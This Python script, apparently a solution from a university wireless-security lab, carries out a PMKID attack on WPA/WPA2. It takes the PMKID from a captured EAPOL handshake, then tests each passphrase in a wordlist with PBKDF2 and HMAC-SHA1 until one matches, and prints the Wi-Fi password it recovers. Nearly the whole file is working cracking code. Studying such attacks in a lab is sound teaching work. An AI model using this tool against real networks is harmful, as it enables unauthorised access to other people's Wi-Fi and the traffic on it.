#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Derive WPA keys from Passphrase and 4-way handshake info

Calcule un MIC d'authentification (le MIC pour la transmission de données
utilise l'algorithme Michael. Dans ce cas-ci, l'authentification, on utilise
sha-1 pour WPA2 ou MD5 pour WPA)
"""

__author__ = "Abraham Rubinstein et Yann Lederrey"
__copyright__ = "Copyright 2017, HEIG-VD"
__license__ = "GPL"
__version__ = "1.0"
__email__ = "abraham.rubinstein@heig-vd.ch"
__status__ = "Prototype"

from scapy.all import *
from binascii import a2b_hex, b2a_hex

# from pbkdf2 import pbkdf2_hex
from pbkdf2 import *
from numpy import array_split
from numpy import array
import hmac, hashlib


def customPRF512(key, A, B):
    """
    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
    """
    blen = 64
    i = 0
    R = b""
    while i <= ((blen * 8 + 159) / 160):
        hmacsha1 = hmac.new(
            key, A + str.encode(chr(0x00)) + B + str.encode(chr(i)), hashlib.sha1
        )
        i += 1
        R = R + hmacsha1.digest()
    return R[:blen]

def get_mic(radiotap):
    return radiotap.load[77:77+16]

# Read capture file -- it contains beacon, authentication, associacion, handshake and data
wpa = rdpcap("PMKID_handshake.pcap")
ass_req = wpa.filter(lambda pkt: pkt if pkt.type == 0 and pkt.subtype == 0 else None)[0]
ssid = ass_req.getlayer(Dot11Elt).info

messages = wpa.filter(
    lambda pkt: pkt if pkt.haslayer(EAPOL) and pkt.getlayer(EAPOL).type == 3 else None
)

pmkid = None
mac_ap = None
mac_sta = None
for m in messages:
    # Si message 1 sur 4
    if get_mic(m) == b'\x00' * 16 and mac_ap == None and mac_sta == None:
        pmkid = m.load[101:101+16]
        mac_sta = m.addr1
        mac_ap = m.addr2
        break

if pmkid == None:
    print("Error : no PMKID found")
    exit(1)
    
mac_ap = a2b_hex(mac_ap.replace(":", ""))
mac_sta = a2b_hex(mac_sta.replace(":", ""))
passPhrase = None

f = open('pmkid_wordlist.txt', 'rb')
for line in f.readlines():
    line = line[:-1]
    pmk = pbkdf2(hashlib.sha1, line, ssid, 4096, 32)
    pmkid2 = hmac.new(pmk, b'PMK Name' + mac_ap + mac_sta, hashlib.sha1)
    pmkid2 = pmkid2.digest()[:16] # On veut 128 bits et non 160
    
    line = line.decode()
    print(f"Password tested : `{line}`")
    if pmkid == pmkid2:
        print(f"Password found : `{line}`")
        passPhrase = line
        break

f.close()

print("\n\nValues found")
print("============================")
print("SSID: ", ssid, "\n")
print("AP Mac: ", b2a_hex(mac_ap), "\n")
print("Client Mac: ", b2a_hex(mac_sta), "\n")
print("PMKID: ", b2a_hex(pmkid), "\n")
print("Passphrase: ", passPhrase, "\n")

